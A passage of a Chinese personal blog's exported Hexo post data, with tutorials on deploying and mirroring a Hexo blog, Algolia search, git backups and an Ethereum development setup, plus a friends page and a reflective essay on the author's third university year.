搜索引擎收入coding内容 利用可控域名，通过CNAME解析到不同域名中，通过DNS实现负载均衡 为什么是coding 因为gitee实在太慢了，性能堪忧；加上coding能白嫖六个月…… 所以这期操作的前提是：你有一个自己可控的域名 Github Page 直接利用原来的Github Page即可 还没有Github Page的可以看这里 Coding 创建一个项目 Hexo同步部署即可 注册账号 官网 创建项目 和Github操作几乎一毛一样，创建一个仓库就行 添加SSH公钥 添加个人SSH公钥 添加项目SSH公钥：代码仓库-&gt;仓库设置-&gt;部署公钥（同时给该公钥写入权限） 注意：一定要添加项目SSH公钥，即使这俩一毛一样……否则会无法写入仓库。这个设计很奇怪，被迫设置两遍 添加之后ssh -T git@e.coding.net试一下有没有读写权限： 设置托管 持续部署- &gt; 网站托管 这里需要实名认证，不想实名认证的同学可以直接腾讯云登录（x） 网站部署 稍微设置一下，之后部署成功的截图大概长这样： 此时点击访问按钮应该能访问网站，但是是404，因为你啥也没写。 设置自定义域名我们的设计是让同一个域名指向两个不同的网址，让DNS服务器来判断走哪条路线最合适……所以需要一个自定义的域名——而且它原本的域名太长了，根部记不住（x）。 Coding自定义域名 这里需要在域名供应商那里添加一条解析，以验证你的域名；同时需要为你的域名绑定证书。 Github自定义域名 注意：Github Page在自定义域名的时候会生成一个CNAME文件，为了避免我们每次更新是该文件被覆盖，需要在本地的source目录下同步创建一个CNAME，该文件内容为你刚刚填写的自定义域名。 同时配置根目录_config.yml，防止CNAME被渲染成html文件 12345skip_render: - README.md - CNAME - html/* # 这里我设置了自定义页面的目录html CNAME存于source目录下，记录值为自定义域名blog.xiabee.cn 证书相关我之前购买xiabee.cn的证书的时候，图便宜搞了个单域名的，现在不支持子域名证书，所以就必须重新配置证书。 本来是准备用OHTTPS搞个免费泛域名的，但是很多浏览器不认他的证书……导致我去腾讯云搞了一个新的证书（划掉）。 想白嫖的同学可以去OHTTPS或者letsencrypt上面看看。 有条件的话尽量选大公司的，很多免费的证书已经不被信任了…… 设置Hexo修改根目录下的_config.yml最后的deploy： 123456deploy: - type: git repo: github: git@github.com:xiabee/xiabee.github.io.git,main coding: git@e.coding.net:xiabee/xiabee-blog/xiabee.coding.me.git # 这里改成自己的项目地址即可 然后hexo g -d，渲染，提交。如果你的SSH公钥设置正确的话，应该是没有很大问题的。 设置域名解析最后把自定义域名同时解析到两个记录值即可： 国内外访问测试国内访问指向coding page： 国外访问指向Github Page： 此时我们的分布式站点已经配置好了（✌）","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"git","slug":"git","permalink":"https://blog.xiabee.cn/tags/git/"}]},{"title":"Archer主题启用Algolia全文搜索","slug":"coding/Archer主题启用Algolia搜索","date":"2021-10-31T15:48:18.000Z","updated":"2022-08-13T15:39:31.406Z","comments":true,"path":"posts/archer-algolia/","link":"","permalink":"https://blog.xiabee.cn/posts/archer-algolia/","excerpt":"","text":"问题描述 Hexo缺少站内搜索功能 Hexo自带的tag功能并不能满足搜索需求 Archer主题自带的搜索模块不能实现全文检索（详情可以参考相关issue） Hexo本质上是一个静态页面的渲染工具，而我们的博客部署在Github Page上，没有数据库的操作权限，也就不能像Wordpress那样自身实现站内的高级搜索……然而主题自带的第三方搜索插件又无法检索文章内容…… 解决方案 利用Archer封装的第三方插件Algolia实现搜索 利用hexo-algoliasearch实现全文检索 为什么不直接用hexo-algoliasearch做搜索 因为主题没有封装，裸着搜索很违和，自己封装又好累(x) Archer主题的algolia设置Algolia简介 官网 提供云搜索 白嫖用户可上传10,000条JSON数据 白嫖用户每个月可操作共100,000次（上传、搜索） 注册Algolia 直接官网注册即可 注册之后会创建一个应用，并得到一些API Keys，记住这些API Keys，一会需要用到 在Applications中能看到刚刚申请的应用id，API Keys里面有需要的API key 注意：不要在任何配置文件中填写Admin API Key！如果有必要，则使用全局变量的方式替代 修改Hexo根目录的_config.yml搜索algolia模块，如果没有则自己添加一个： 12345678910111213# searching algolia: applicationID: &#x27;xxxx&#x27; # used for hexo-algolia appId: &#x27;xxxx&#x27; # used for hexo-algoliasearch apiKey: &#x27;xxxxxxx&#x27; chunkSize: 5000 indexName: &#x27;xxxxxx&#x27; fields: - path - title - content:strip - excerpt:strip # fields 这栏根据自身需求设置 这里的applicationID和appId其实是一个东西，就是刚刚创建的应用的ID，只是我们需要利用两个不同的插件，所以写了两遍。 安装相关插件在Hexo根目录下执行： 12345npm install hexo-algolia --save# 这个是主题集成的搜索模块所需插件，不支持搜索文章内容npm install hexo-algoliasearch --save# 这个是我们搜索全文用到的插件 修改主题_config.ymlArcher主题自身集成了algolia模块，把主题的_config.yml中的algolia_search模块的false改成true即可 123456789# ========== Search ========== #algolia_search: enable: true hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: &quot;We did not find any results for the search: $&#123;query&#125;&quot; hits_stats: &quot;$&#123;hits&#125; results found in $&#123;time&#125; ms&quot; 注意：需要先安装相关插件再启用algolia模块，否则在渲染时会缺少js文件导致程序报错。 hexo-algoliasearch相关设置全部设置可以参考官网 安装模块hexo-algoliasearch刚刚已经安装过了，就不重复安装了 修改_config.yml在Hexo根目录的_config.yml文件中添加plugins字段： 12plugins: - hexo-algoliasearch 参数设置 不要像官网一样把adminApiKey写进配置文件里！（因为总有人会顺手把配置文件传到Github，比如我） 在不填写adminApiKey的时候，可以通过环境变量的方式认证adminApiKey（Windows用户手动添加PATH即可） 12345export ALGOLIA_ADMIN_API_KEY=xxxxxxxx# 你的 admin_api_keyexport HEXO_ALGOLIA_INDEXING_KEY=xxxxxxx# 你的Search-Only API Key PS：Search-Only API Key其实就是配置文件中的apiKey，但是有时候hexo-algoliasearch模块莫名其妙找不到这个Search-Only API Key，可以通过上面的操作解决。 更新Algolia如果你不是WSL用户，这时直接hexo aloglia即可。 如果是WSL用户，则需要检查一下环境变量有没有被覆盖……最懒的办法就是每次都添加一遍（不是） 12345678export ALGOLIA_ADMIN_API_KEY=xxxxxxxx# 你的 admin_api_keyexport HEXO_ALGOLIA_INDEXING_KEY=xxxxxxx# 你的Search-Only API Keyhexo algolia# 更新 algoia 此时在Algolia管理界面里面已经能看到文章内容了： 搜索效果 标题包含关键词的会标红，文章内容包含关键字也能搜索到","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"archer","slug":"archer","permalink":"https://blog.xiabee.cn/tags/archer/"},{"name":"algolia","slug":"algolia","permalink":"https://blog.xiabee.cn/tags/algolia/"}]},{"title":"Hexo更换主题","slug":"coding/Hexo更换主题","date":"2021-10-31T14:46:18.000Z","updated":"2022-08-13T15:39:31.411Z","comments":true,"path":"posts/hexo-archer/","link":"","permalink":"https://blog.xiabee.cn/posts/hexo-archer/","excerpt":"","text":"本站主题 Archer Demo 更换方式 官网下载主题 将主题源代码解压到hexo的theme目录下，并更改该主题的目录名称 修改hexo根目录中的_config.yml文件的theme字段，将其改为对应主题的目录名 然后进入主题目录，找到主题的_config.yml进行修改即可。 最后重新渲染并部署： 123hexo cleanhexo ghexo d Hexo主题 官网主题 知乎推荐","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"archer","slug":"archer","permalink":"https://blog.xiabee.cn/tags/archer/"}]},{"title":"利用git分支进行Hexo备份","slug":"coding/Hexo备份","date":"2021-10-28T15:46:18.000Z","updated":"2022-08-13T15:39:31.407Z","comments":true,"path":"posts/hexo-git-backup/","link":"","permalink":"https://blog.xiabee.cn/posts/hexo-git-backup/","excerpt":"","text":"hexo博客搭建可以看这里。 问题描述博客搭建环境：hexo+gitpage，本地编写·markdown文件，通过hexo g -d渲染后上传至github repo。 相较于wordpress，hexo框架的博客编写基本是在本地完成，在其他机器写博客时需要备份并重新配置环境。但是nodejs环境文件很多，备份起来相当麻烦。 解决方案大致有两种方案： 创建新仓库，备份源文件 创建新分支，备份源文件 创建备份这里我们主要介绍github分支的方式：主分支用于渲染github page，分分支用于备份重要源文件。 创建新仓库的方式同理，就不介绍了（x） 在hexo根目录下创建git最新版的hexo在初始化之后是没有.git目录的，通过_config.yml里面的deploy参数生成.deploy_git目录，并在通过该目录进行push操作。因此，我们直接在hexo根目录下创建.git目录和.gitignore并不会冲突。 创建本地git的方式有很多种，只需要将git的指向我们xxx.github.io的repo就行。 比如可以直接将xxx.github.io的整个repo克隆下来，然后复制其中的.git目录到hexo的根目录下。 创建.gitignore常见的需要备份的文件大致有： 1234567scaffolds/source/themes/.git/.gitignore_config.ymlpackage.json 然而，每次筛选很麻烦，这里我们直接在hexo根目录下创建.gitignore排除剩下的不需要备份的文件。 示例如下： 12345678910111213# .gitignore.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/.git*/themes/!themes/archer/_config.yml# 这里只备份主题的配置文件.vscode/ 创建分支在刚刚创建好git的hexo的根目录下执行：这里以 hexo_backup 分支为例 1234567891011121314git branch -a# 查看所有分支git branch # 查看当前使用分支git checkout hexo_backup# 切换到 hexo_backup 分支上，若不存在则创建该分支并切换到该分支# git branch -d hexo_backup# 删除本地 hexo_backup 分支# git push origin --delete hexo_backup# 删除远程 hexo_backup 分支 确保新分支不要与主分支重名……尽量不要取master、main这种名字就好。 提交备份因为之前写了.gitignore，我们可以放心大胆的将当前目录全部commit： 12345678git add .# 添加当前目录git commit -m &quot;backup&quot;# 添加commit，引号内的内容随意git push origin hexo_backup# 将本地数据推送到 hexo_backup 分支中 远程仓库已有两个分支，因此必须指定分支hexo_backup，不能直接git push。 此时本地分支和远程分支匹配 此时已经备份完毕了。 迁移与复原新环境配置12npm install -g hexo-clihexo init 克隆备份分支将原来的source, package.json等文件克隆到hexo根目录下 12git clone -b hexo_backup git@github.com:[username]/[username].github.io.gitnpm install 渲染与推送123hexo cleanhexo g -d# 生成新的页面并推送至主分支 主分支利用hexo自身集成的git组件进行推送：","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"git","slug":"git","permalink":"https://blog.xiabee.cn/tags/git/"}]},{"title":"Hexo+GitPage搭建个人博客","slug":"coding/Hexo搭建个人博客","date":"2021-10-27T15:46:18.000Z","updated":"2022-08-13T15:39:31.407Z","comments":true,"path":"posts/hexo-git-setup/","link":"","permalink":"https://blog.xiabee.cn/posts/hexo-git-setup/","excerpt":"","text":"前言之前一段时间都是用wordpress做个人博客，后来发现Git Page + hexo可以免费做静态页面……尝试了一下，后面就真香了（x） 关于wordpress和hexo孰优孰劣的问题这里不做详细讨论，只是介绍一下如何用Git Page+hexo搭建一个个人博客。二者具体的比较可以参考知乎的激(you)烈(hao)讨论。 简介What’s GitHub Page 官方文档 简而言之就是 白嫖 GitHub的服务器，通过仓库挂一个自己的静态网站。 What’s Hexo 官方文档 一个渲染静态博客的框架，基于Node.js，将markdown文件渲染成html文件 Hexo + Github Page 利用hexo快速生成需要的页面，利用github在公网展示出来 创建Github Pages创建一个公网能访问的page，让大家能看到你的博客，这里利用Github page 创建repo创建一个名为xxx.github.io的仓库，且允许公网访问： 创建Pages在里面随便新建一个文件，确保main分支有东西。 然后在Settings -&gt; Pages里面设置分支和网站根目录：这里直接设置为main和/(root)。如果网页上传在其他分支上可以在这里修改。 此时访问https://test.github.io应该就能看到刚刚的网页了。（因为我已经开了一个xiabee.github.io，而免费版只能开一个网页，所以test.github.io就暂时无法展示） 环境搭建Node.js Linux用户：直接包管理器安装即可 123# 例如Ubuntuapt updateapt install nodejs 包管理器找不到nodejs的可以和Windows用户一样取官网安装。 Windows用户：官网下载并安装 NPM node.js一般自带npm，但是可能不是最新版的npm，直接更新即可 12345678910apt-get install nodejs-legacyapt-get install npmnpm install -g n# 安装n模块n stable# 升级nodejs到最新stable版本npm install npm@latest -g# 升级最新npm 如果没有自带npm可以去官网看看，手动安装npm Git Linux：直接包管理器安装 123# ubuntuapt updateapt install git Windows：官网下载安装 配置ssh登录可以参考这篇博客 HEXO先装hexo-cli： 12sudo npm install -g hexo-cli# 全局安装hexo 本地调试hexo根目录选择一个空目录做为hexo的根目录，初始化并安装相关依赖： 这里建议把刚刚创建的Github Page的repo克隆下来，再把该目录删空作为根目录……不然可能会遇到分支没有共同基点不能合并的问题。 12345hexo init # 在该目录下初始化npm install# 安装依赖 常用hexo命令：12345678hexo g # hexo generate# 渲染页面，生成网页hexo s # hexo server# 启动本地服务器，提供预览和本地调试hexo clean# 清理本地网页 访问http://localhost:4000，出现hexo页面说明渲染成功 这里我修改过主页，所以可能看起来和初始模板不太一样。 Tips：如果server一直起不来，可能是端口被占用了。Ctrl C 关闭服务器，运行 hexo server -p 5000 更改端口号后重试。 hexo常见目录结构123456789├── _config.yml # 网站配置信息├── node_modules # nodejs组件├── package.json├── package-lock.json├── public # 生成的网站文件├── README.md ├── scaffolds # 模板文件夹├── source # 写博客的markdown源文件└── themes # 主题文件夹 远程推送把hexo推送到github中 安装hexo-deployer-git1npm install hexo-deployer-git --save 修改_comfig.yml找到hexo根目录下的_config.yml，文末deploy:模块： 12345678## Docs: https://hexo.io/docs/one-command-deploymentdeploy: type: git repo: github: git@github.com:xiabee/test.github.io.git branch: main gitee: git@gitee.com:xiabee/test.gitee.io.git branch: main 这里是做了Gitee+GitHub双备份，如果不传gitee的话可以只写github的仓库地址。 此时指定hexo上传的网页文件为main分支，如果刚刚Github Page的分支不是main的可以修改一下……改哪个都可以，一致即可。 这里GitHub Pages用的就是main分支，不需要修改 推送1234567hexo g # 渲染页面hexo d# 推送至git，部署发布# 二者结合相当于 hexo g -d 此时访问公网地址，已经能看到该博客了： 写文章编辑源文件在_posts目录下创建markdown文件，仿照Hello World写就行： 然后hexo g -d，渲染、推送。 关于图床如果是整个媒体库都上传到Github上的话，相当于是把Github作为图床了……然而众所周知Github在国内的速度非常非常慢。所以建议换一个好用的图床。 关于图床的推荐可以参考一下知乎。 这里我个人使用的是微博图床，配合Chrome插件新浪微博图床使用，可以直接微信截图到剪贴板，然后复制粘贴，灰常方便： 当然，用这个图床的前提是你得有一个微博账号（x） Hexo备份 利用Git分支 参考这篇博客","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"git","slug":"git","permalink":"https://blog.xiabee.cn/tags/git/"}]},{"title":"FRIENDS","slug":"informal-essay/FRIENDS","date":"2021-09-30T16:00:00.000Z","updated":"2022-08-23T08:02:04.602Z","comments":true,"path":"posts/fri/","link":"","permalink":"https://blog.xiabee.cn/posts/fri/","excerpt":"","text":"姓李名唐朝二中校友，同级，剑桥博士，研究方向：HCI 个人主页：https://dynasty-li.github.io xiabee碎碎念自己的公众号，随缘更新 Click here to show QR code xiabee碎碎念 IZAYOI前浪学长，二进制方向，入职360，做IoT安全 个人主页：cerr.cc layfolk同级大佬，（前）科技创新基地移动政务实验室主任，睿信书院技术保障中心部长，乐于帮助同学解决学业困难 个人主页：计算机专业资料分享 公众号：俊霖说IT 语雀：李俊霖 · 语雀 mariozzj二中同班同学，南京大学直博 个人主页：https://blog.mariozzj.cn/ zesia0二中校友，后浪学弟，成电SE，WEB方向，曾在长亭实习，膜了 个人主页：a3bz.top 北国鸣鹤二中校友，同级，北交大佬 个人主页：https://rzvtech.top/（已失效） Rex Huang黄神，自动化大哥，玩的东西计科菜狗已经看不懂了…… 个人主页: http://livingin2077.top/ （已失效） GitHub：https://github.com/HRex39 Spaceskynet后浪学弟，数院人整计院活，科技创新基地信安实验室19级主任 个人主页：http://spaceskynet.top/ 洛水天依同级大佬，二进制方向，和博主与饿龙一起扛下了整个19级的教学 个人主页: http://everything411.top/ 墨雨琪前浪学长，WEB方向，博主师傅，现就读于中科院信工所 个人主页：https://fromhex.cn/ 98年生的猫前浪的前浪学长，WEB转密码学，师傅的师傅 个人主页：https://code.felinae98.cn/ 橘子哥前浪学长，网协前网络部部长，带博主走进BIT NP的大哥 个人主页：https://ugorange.com/（已失效） FKY前浪学长，信安实验室17级主任，朋友圈内最长恋爱时长保持者 个人主页：https://blog.fkynjyq.com/ 大笨猪同级大佬，博主隔壁寝室的好兄弟，一起干作业一起考研，个人感觉比较佛系 个人主页：http://learnfzero.top/ olist213实习时遇到的师傅，专业的，膜了 个人主页：https://olist213.github.io/ Martian演习友军，北工大大佬，考研研友 个人主页：https://i.urox.cn FGM后浪学弟，好像也在搞web 个人主页：http://darkstars.cn/","categories":[{"name":"friends","slug":"friends","permalink":"https://blog.xiabee.cn/categories/friends/"}],"tags":[{"name":"friends","slug":"friends","permalink":"https://blog.xiabee.cn/tags/friends/"}]},{"title":"三天速成智能合约–DAY1：环境安装","slug":"blockchain/智能合约","date":"2021-08-28T04:00:23.000Z","updated":"2022-08-28T03:32:54.110Z","comments":true,"path":"posts/blockchain-start/","link":"","permalink":"https://blog.xiabee.cn/posts/blockchain-start/","excerpt":"","text":"事件起因我们组的信安作品赛“被迫”加了一项智能合约的部署，某子剑老师：“智能合约三天就够了” 试了一下，三天确实够了。 本文以 Ubuntu-20.04为例，记录一下环境搭建过程。 主要涉及环境： 1234- geth- npm- truffle- ganache 相关概念这里不妨假设大家已经非常熟悉智能合约、区块链、消息认证、非对称密码等概念与算法，就不做过多介绍了。（其实是太鸽了，还没写，下次一定） 智能合约 智能合约（Smart contract ）是一种旨在以信息化方式传播、验证或执行合同的计算机协议。智能合约允许在没有第三方的情况下进行可信交易，这些交易可追踪且不可逆转。 https://baike.baidu.com/item/%E5%8C%BA%E5%9D%97%E9%93%BE/13465666 区块链 区块链是一种按照时间顺序将数据区块以链条的方式组合成特定数据结构， 并以密码学方式保证的不可篡改和不可伪造的去中心化共享总账(Decentralized shared ledger)，能够安全存储简单的、有先后关系的、能在系统内验证的数据。 广义的区块链技术则是利用加密链式区块结构来验证与存储数据、利用分布式节点共识算法来生成和更新数据、利用自动化脚本代码(智能合约)来编程和操作数据的一种全新的去中心化基础架构与分布式计算范式。 https://cloud.tencent.com/developer/article/1532748 详细概念我们以后再聊（如果我还记得的话） 这里我们编写的智能合约主要是区块链的智能合约，暂时不考虑物联网的合约；区块链具体的链为以太坊。 相关环境GETHGeth，Go-Ethereum，以太坊官方客户端软件，由以太坊基金会提供，用Go语言编写的。Geth提供了一个交互式命令控制台，通过命令控制台中包含了以太坊的各种功能（API）。 这里以Ubuntu系统为例，安装过程如下： 123456sudo add-apt-repository -y ppa:ethereum/ethereum# 添加官方源sudo apt-get updatesudo apt-get install ethereum# sudo apt-get install geth 也是可以的# 安装geth 如果不能导入官方源可以考虑源码安装： 12345678910sudo apt-get install golang# 安装go语言编译环境go env -w GOPROXY=https://goproxy.cn# 更换go语言代理git clone https://github.com/ethereum/go-ethereumcd go-ethereummake all# 下载安装以太坊export PATH=$PATH:/home/$USER/go-ethereum/build/bin# 设置环境变量 其他安装方式可以参考官方文档 一些小问题： 网上有直接通过snap安装的，但是我在测试的时候发现snap安装的版本有玄学bug，比如初始化的时候读不了外部文件，一直提示Permission denied……然后折腾了一上午不知道为啥，换官方源安装解决了 源码安装没问题，我的WSL里面用的时源码安装，但是配置GO的环境比较麻烦，WSL每次启动都得改环境变量，非常折腾……要不是WSL用的是kali官方源不支持，谁手动装这玩意 NPMNPM可以简单的理解为 JavaScript的包管理器，用于下载和部署Nodejs等项目。 安装方式：APT安装npm和nodejs 12sudo apt updatesudo apt install nodejs npm 查询版本，出现下图说明安装成功： 常见问题与解决方案： 下载速度太慢——换源 经常需要sudo——换所有者 npm换源： 123456789101112131415161718192021npm config get registry# 查看当前地址：# https://registry.npmjs.org/ npm config get disturl# undefined npm --registry https://registry.npm.taobao.org install# 临时更换仓库地址npm config set registry http://registry.npm.taobao.org/# 换为阿里源 npm config set registry https://registry.npmjs.org/# 换回官方源npx nrm use taobao# 使用nrm工具切换淘宝源npx nrm use npm# 如果之后需要切换回官方源可使用 切换所有者： 12sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;# 这样就不用sudo了 详细教程可以参考官方文档，如果有时间我们再来细聊 Truffle &amp;&amp; ganacheTruffle是针对基于以太坊的Solidity语言的一套开发框架，本身基于Javascript，能够方便的管理智能合约运行的环境，并且提供一套便捷开发智能合约(Smart Contract)的API。 ganache是以太坊开发的一个常见客户端，测试阶段我们使用ganache，完成开发后使用geth接入。 详细教程可以参考官方文档中文翻译，但是由于文档比较老，版本基本上为truffle2或者truffle3，现在的truffle版本已经升级到了5.3.7，故部分操作命令会有区别，我们会在后续的文章中讲到。 安装要求：NodeJS 5.0+ 安装方式： 12345sudo npm install -g truffle# 安装服务端/IDEsudo npm install -g ganache-cli # 安装测试客户端，最终的客户端为GETH，前面已经安装过 看到这个说明安装成功： 常见问题： 安装到一半卡住，重新安装目录非空——进入该目录，删掉package文件（找不到就删掉所有文件） 安装到一半堆溢出——这个没啥好办法，历史遗留玄学问题，我已经把内存限制调到16G了依然能溢出……看脸吧 小结暂时没想到还需要装啥，就先写到这吧，下一篇：GETH从入门到入土 三天速成智能合约的第一天，把环境装好就行，顺利的话还有点时间多，可以预习一下这些工具的基本操作。","categories":[{"name":"blockchain","slug":"blockchain","permalink":"https://blog.xiabee.cn/categories/blockchain/"}],"tags":[{"name":"blockchain","slug":"blockchain","permalink":"https://blog.xiabee.cn/tags/blockchain/"},{"name":"smart contract","slug":"smart-contract","permalink":"https://blog.xiabee.cn/tags/smart-contract/"}]},{"title":"我的大三","slug":"informal-essay/我的大三","date":"2021-07-15T12:00:23.000Z","updated":"2022-08-13T15:39:31.426Z","comments":true,"path":"posts/2021-summer-year3/","link":"","permalink":"https://blog.xiabee.cn/posts/2021-summer-year3/","excerpt":"","text":"一篇碎碎念——2020很魔幻，2021也是。 北理圣水 关于课程相较于大三下，大三上的几门必修课感觉也没有难么难顶。 计算机组成原理计组老师（MZM）讲课比较催眠，所以计组大部分内容还是靠课后自学。 操作系统内容比较多，主要还是靠记忆，技巧性的东西不多，加上作业题比较简单，所以选择在考试周突击复习（不过感觉平时也没那么放纵的亚子）。感觉MB老师上课还算有意思，但是给分好像没有其他老师那么仁慈…… 操作系统课设比较肝，编写的程序需要大量调用底层接口，可能会遇到意想不到的BUG，虽然大部分实验都是面向GitHub编程，或者面向学长学姐编程。 软件工程基础当时最令人头疼的一门课，GYJ老师（Diego爸爸）的要求很迷幻：把全班110余人分为AB两队，相互竞争，做一套英语学习系统；队内再进行细分，分为管理组、WEB组、安卓组、硬件组、质保组等，每节课都要拿出部分时间进行汇报、讨论等，画出的蓝图像极了他准备直接使用的亚子，也正是因为这点，大家都显得比较抗拒，虽然大家也知道自己的作品应该也不能直接上线，毕竟写的太烂了。我当时是B队WEB2组组长，最开始极其抗拒这种项目，后来想通了开始摆烂——另一个组必然也做不出来，那就一起躺平吧。最后进度远低于老师的预期，所有组都停留在PPT和画图阶段，实际编码量几乎为零，所以最后的展示答辩变成了吹水发布会。但是在这个过程中，全班人完全按照软件工程开发的过程走了一遍，收获还是有的——这课的意义应该也在于此。从最后的结果看，相较于其他老师班，我们虽然提出了一个很大很离谱的项目工程，但是大家都没做，实际的编码量可能还没有其他班的个人项目多。 计算机新技术专题是最水的选修课了，没有之一。上课扫码签到，扫完码该干嘛干嘛。最后考勤占30分，论文占70分，其中论文排版占40%，重复率占40%，内容占30%……一篇5000字论文拿下两学分，非常轻松（相较于大三下的某课程）。 安全协议个人认为也比较水，主要是密码学的后续。在开课的时候老师统计了一下没有上过密码学的人数，上过的人寥寥无几，然后讲了半个月的密码学.（Emm）。课程使用的教材是上交的，书上写了很多我们没学过前序课程，比如抽象代数、群论……但是上课上的比较水，所以应付考试没有太大问题，不过要完全把书啃透，还是需要一点数学功底的。 流行音乐鉴赏大三上还报了一门艺术实践，王颖老师的。上课很有意思，给我们讲流行音乐，放音乐电影，从来不点名，最后靠一篇2000字小作文给分，要求是不要太学术，写口水文都行（?）。这课大概是我大三上唯一一门用来放松的课，上课的时候还能和QZX线下唠嗑。 大三下的几门课就有点难过了，各种意义上的难过。 编译原理一门平时分50分的课……实验占了40分。最初实验一和实验二还勉强能够独立完成，但到后期的几个大实验让我感觉这课应该单独开一个课设……最后还是面向GitHub和学长学姐编程了，而且这次还做了文本工程师（无奈.jpg）。 计算机网络也是头痛课程之一，倒也不是很难，就是要求巨多。一门双语课，有协议分析、有编程实验、有团队答辩、有个人论文、有考试。虽然最后的最后还是因为进度问题，老师没有按照去年的教学计划直接上十几个实验，但是这个团队配合协议模拟编程也比较磨人……加上四月五月比赛比较忙，最后五月底六月初就忙上加忙。 计算机体系结构应该是比较简单的一门课了，指平时要求。平时分20分虽然不多，但是拿起来很轻松，就一篇论文一个小汇报，加上WYZ老师上课本来就挺摸的，所以这课还算是给大三下一点点喘息的机会。而且这课和计组、OS有大量重复内容，以至于20级的培养方案已经把这课去掉了…… 汇编与接口技术还算正常，内容需要记忆，但相对体系结构内容较少。平时有编程作业，从配置环境到实际开发确实有点麻烦，但和编译原理的屎山代码比起来已经简单多了。我们班的大作业没有课堂展示，隔壁班的展示让人看不懂但大受震撼：汇编做双人对战贪吃蛇、汇编FPS游戏、汇编网络通信……只有想不到没有卷不出。虽然个人认为这样的游戏已经背离了汇编课程的设计初衷。 网络与信息安全这学期的选修课捡到了本学期最水的****（虽然也是同学退课捡到的），ST老师YYDS！课程内容不复杂，和导论课比较像，最后得分是一篇三页以内的小论文、一个五页以内的大作业、一次小测。小测是开卷的，考点全在PPT里，所以一个小时的考试，半小时后就有人交卷。 网络安全与技术实践关于工图能不能抵扣科技实践的问题，书院和学院扯皮一直没个结果，所以大三下了我又选了一门科技实践。对于一个大三老油条来说这课相当水，上课讲的理论知识基本上都学过，然后实验也基本上是使用工具，没有涉及安全开发之类的，大部分也都有保姆级的教程……所以这课也算比较放松，就是写实验报告的时候总是不自觉的越写越多，花了挺多时间的（x）。 关于竞赛大三上的时候感觉每个周末都在打比赛……虽然技术确实菜，人菜瘾大。湖湘杯、东华杯、职业杯什么的，有些比赛太白给了没进线下，比如东华杯和校内ACM撞车了，一整天泡在实验室里，CTF白给ACM也白给。去年有一个对WEB狗非常友好的比赛运维杯，今年信心满满的准备干个痛快，结果它不办了……然后今年护网杯完全错过了，没人发通知了然后大家都忘了（哦，是我发通知啊，那没事了） 大三上唯一一次打进线下可能是职业杯了，唐老板YYDS！虽然这个比赛大部分都是职业哥，日起站来各显神通，看别人WP直呼好家伙。然而最后因为时间太紧以及比赛级别问题，距离考试周太近了，加上报销比较困难，最终还是选择放弃线下赛。 大三下因为课程本来就顶，竞赛方面只参加了校内的ISCC和信安国赛CISCN，强网杯、鼎网杯、蓝帽杯、红帽杯直接选择放弃……妹时间了。今年的ISCC水了个个人挑战赛国一，但是擂台几乎没打，最后应该是拿一个全国赛区奖一个北理赛区奖。CISCN的话，感觉很迷，去年易霖博办的时候就知乎开骂了，今年给360办也整了一些烂活。然而去年打进分区赛了，因为课程没法打线下；今年打进分区赛了，因为考试没法打线下……世事难料。 这学期还参加了信安国赛的作品赛，主要跟着ZZJ老师做零知识证明。作品很大涉及内容很多很难搞，但是顺利进入了决赛，最终的比赛结果看月底去青岛的答辩情况了。 作品赛决赛名单 后续：信安作品赛决赛拿到了国二：信安作品赛，国二get 2021年8月 关于团队合作今年的团队合作项目非常多，尤其是大三下，几乎每门课都有团队合作。也正是这些多到夸张的团队合作，让我对团队合作有了新的认识。 合作内容列举 课程/项目 描述 我的职责 合作的如何 软件工程 做一个几乎不可能做出来的英语学习系统 WEB组组长（共7人） 定期开组会，但是大家都在鸽，带着大队长一起鸽，最后一起做文本工程师 操作系统课设 一个简易的Linux Shell，要求代码量2000行以上 组长（共4人） 没开过组会；因为21年初北京疫情加重提前回家，在最后一个组员到家前几乎是我一个人在写；最后大家都push起来的时候比较顺利，在DDL前两天完成任务 计算机网络 模拟GBN、DV两个协议的三种语言实现 组长（共7人） 几乎没有组会；有些组员很自觉，有些组员一直鸽，不过大家都赶在DDL之前完成了项目，最后的最后答辩也还算满意 计算机体系结构 一篇5000字论文，一个答辩汇报 组长（共3人） 没开过组会；最初是我比较鸽，在计网DDL到来前意识到不对劲，push起来了，分工也还算明确，可能是项目比较简单 汇编与接口技术 汇编写游戏，最后我们决定写一个扫雷躺平 组长（共5人） 没开过组会；开始时间较晚，因为前期各种项目干不完。但是决定躺平之后大家做的也还算可以，提前完成任务。 信安作品赛 联邦学习安全，零知识证明的落地 组长（共4人） 每周组会；因为部分环境不是所有人都能运行，所以各自负责的模块逐渐偏离了当初的选择；相较于其他项目，这个应该是最push的一个；尽管留下很多坑，但还是在DDL之前完成了项目。四月五月在肝作品赛，导致其他项目一直鸽到了六月 个人感受 大部分人都是DDL战士，即使自己不是，也要假设队友是。在项目中期大家的效率会非常低，不要在此时分配过多的任务； 应该假设大家都不愿意抽出大量时间来做团队项目。大家的时间非常不固定，你的队友可能要考研、出国、实习，你不知道他们还在哪些项目组里做哪些活，所以团队项目任务过重的话注定无法完成；但也不是说可以一直划水，要适当的push； 适当降低标准。并不是所有人都是全栈工程师，你擅长的项目可能其他人会觉得非常困难，过高的标准只会让大家觉得不可实现，反而消磨了积极性。 关于收获收获还是很多的。 成为预备党员2021年4月10日，经支部大会表决通过，我成为了一名预备党员。 我的入党志愿书 竞赛获奖今年的ISCC成功让我的简历加了两行废话，信安国赛作品赛可能也能再加一行。 全国赛区一等奖 北理赛区第一 